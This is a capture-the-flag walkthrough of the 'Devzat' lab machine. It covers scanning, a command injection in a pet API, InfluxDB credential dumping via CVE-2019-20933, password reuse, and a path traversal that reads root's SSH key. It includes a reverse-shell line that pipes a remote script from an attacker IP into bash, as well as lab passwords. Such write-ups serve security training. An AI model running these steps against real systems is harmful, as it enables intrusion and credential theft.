# Devzat

---

## Enumeration & Foothold

- nmap TCP scan:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)
|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)
|_  256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: devzat - where the devs at
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
8000/tcp open  ssh     (protocol 2.0)
| ssh-hostkey: 
|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
```

- Found subdomain `pets`, using a dirscan on this subdomain found a git repo `/.git` and it contains the app source code
- Found code injection vulnerability in `main.go`, on the parameter `species` in the POST request to `/api/pet`, with payload `; <CODE>`
- Got a revshell with the payload:

```bash
curl 10.10.16.2/shell.sh | bash
```

- Found a private RSA key for SSH,

---

## Lateral Movement

- Need to go from `patrick` to `catherine`
- In devzat source code, found a hard-coded convo:

```go
   if strings.ToLower(u.name) == "patrick" {
		u.writeln("admin", "Hey patrick, you there?")
		u.writeln("patrick", "Sure, shoot boss!")
		u.writeln("admin", "So I setup the influxdb for you as we discussed earlier in business meeting.")
		u.writeln("patrick", "Cool :thumbs_up:")
		u.writeln("admin", "Be sure to check it out and see if it works for you, will ya?")
		u.writeln("patrick", "Yes, sure. Am on it!")
		u.writeln("devbot", "admin has left the chat")
	} else if strings.ToLower(u.name) == "admin" {
		u.writeln("admin", "Hey patrick, you there?")
		u.writeln("patrick", "Sure, shoot boss!")
		u.writeln("admin", "So I setup the influxdb for you as we discussed earlier in business meeting.")
		u.writeln("patrick", "Cool :thumbs_up:")
		u.writeln("admin", "Be sure to check it out and see if it works for you, will ya?")
		u.writeln("patrick", "Yes, sure. Am on it!")
	} else if strings.ToLower(u.name) == "catherine" {
		u.writeln("patrick", "Hey Catherine, glad you came.")
		u.writeln("catherine", "Hey bud, what are you up to?")
		u.writeln("patrick", "Remember the cool new feature we talked about the other day?")
		u.writeln("catherine", "Sure")
		u.writeln("patrick", "I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.")
		u.writeln("catherine", "Kinda busy right now :necktie:")
		u.writeln("patrick", "That's perfectly fine :thumbs_up: You'll need a password I gave you last time.")
		u.writeln("catherine", "k")
		u.writeln("patrick", "I left the source for your review in backups.")
		u.writeln("catherine", "Fine. As soon as the boss let me off the leash I will check it out.")
		u.writeln("patrick", "Cool. I am very curious what you think of it. See ya!")
		u.writeln("devbot", "patrick has left the chat")
```

- First, influxdb 1.7.5 is vulnerable to an authentication bypass [CVE-2019-20933](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933) and was able to dump the database, got users unencrypted clear-text creds:
- I forwarded both ports `8443` wich is the local devzat instance that has these hard-coded messages and the new feature `/file` and also port `8086` which the influxdb running locally.

```json
// [admin@127.0.0.1/devzat] $ select * from "user"

{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "time",
                        "enabled",
                        "password",
                        "username"
                    ],
                    "name": "user",
                    "values": [
                        [
                            "2021-06-22T20:04:16.313965493Z",
                            false,
                            "WillyWonka2021",
                            "wilhelm"
                        ],
                        [
                            "2021-06-22T20:04:16.320782034Z",
                            true,
                            "woBeeYareedahc7Oogeephies7Aiseci",
                            "catherine"
                        ],
                        [
                            "2021-06-22T20:04:16.996682002Z",
                            true,
                            "RoyalQueenBee$",
                            "charles"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
```

- Catherine's password `woBeeYareedahc7Oogeephies7Aiseci` is reused for her user on the target machine, I can SSH in or `su catherine` with her password and get user.txt

---

## Privilege Escalation

- Logging in the chat app on port `8443` as `catherine` and now I have access to the new feature `/file`.
- To find the password that protects this feature, I searched for the backup location that they were talknig about and found 2 zip files, main and dev in  `/var/backups`, transferred them to my machine and did a `diff main dev` just like patrick suggested and got the password: `CeilingCatStillAThingIn2021?`

```bash
catherine: /file /etc/passwd CeilingCatStillAThingIn2021?
[SYSTEM] The requested file @ /root/devzat/etc/passwd does not exist!
```

- At this point is simple, `/file ../.ssh/id_rsa`, got root's ssh private key, logged in as root, got root.txt

---
